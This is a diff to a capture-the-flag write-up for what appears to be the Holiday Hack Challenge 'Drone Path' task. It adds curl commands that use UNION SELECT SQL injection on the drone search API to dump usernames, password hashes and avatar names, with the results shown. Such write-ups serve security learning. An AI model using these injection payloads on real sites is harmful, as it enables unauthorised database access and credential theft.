@@ -44,7 +44,20 @@ Alternatively this [Perl script](DronePathGold.pl) can be used.
 
 As the [search function](https://hhc24-dronepath.holidayhackchallenge.com/workshop) of the workshop is SQL injectable, it it also possible to carve out other details from the database:
 
+It is possible to pull out all user details:
+
+`
+curl "https://hhc24-dronepath.holidayhackchallenge.com//api/v1.0/drones?drone=Zapper'%20UNION%20SELECT%20username%2c1%2c1%20FROM%20users%3b--"
+[{"name":"Zapper","quantity":"5","weapons":"CarrotSpike"},{"name":"brynne","quantity":1,"weapons":1},{"name":"filo","quantity":1,"weapons":1},{"name":"fritjolf","quantity":1,"weapons":1},{"name":"lira","quantity":1,"weapons":1},{"name":"pip","quantity":1,"weapons":1},{"name":"sprigg","quantity":1,"weapons":1},{"name":"tylwen","quantity":1,"weapons":1}]
+
+curl "https://hhc24-dronepath.holidayhackchallenge.com//api/v1.0/drones?drone=Zapper'%20UNION%20SELECT%20password%2c1%2c1%20FROM%20users%3b--"
+[{"name":"2bb7ab7713cc012f02eb03c95f6e4443","quantity":1,"weapons":1},{"name":"2fd03c8ea542a7fd85ca4ebbcc13d5ca","quantity":1,"weapons":1},{"name":"3c3a4f722ec77c1712941003443a4d83","quantity":1,"weapons":1},{"name":"4f7f1b7c49fa2b0cc22e2d2599f1f2e5","quantity":1,"weapons":1},{"name":"9eb6c13b1b18bc785ffb84d977bf5499","quantity":1,"weapons":1},{"name":"Zapper","quantity":"5","weapons":"CarrotSpike"},{"name":"b9af6f935826ae1a89ecba72476fbcba","quantity":1,"weapons":1},{"name":"e54efff9e6258bef3eb35f093e3bae00","quantity":1,"weapons":1}]
+
+curl "https://hhc24-dronepath.holidayhackchallenge.com//api/v1.0/drones?drone=Zapper'%20UNION%20SELECT%20avatar%2c1%2c1%20FROM%20users%3b--"
+[{"name":"2cf1d29136d246eeb42149e65358abb3.png","quantity":1,"weapons":1},{"name":"Zapper","quantity":"5","weapons":"CarrotSpike"},{"name":"elf13.png","quantity":1,"weapons":1},{"name":"elf17.png","quantity":1,"weapons":1},{"name":"elf23.png","quantity":1,"weapons":1},{"name":"elf3.png","quantity":1,"weapons":1},{"name":"elf5.png","quantity":1,"weapons":1},{"name":"elf6.png","quantity":1,"weapons":1}]
+
+`
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbNTAyNDc5MDMwLDIwODMxMjk3MDksNDI5OD
+eyJoaXN0b3J5IjpbLTg0NjU0NzYzLDIwODMxMjk3MDksNDI5OD
 cwOTY1XX0=
 -->
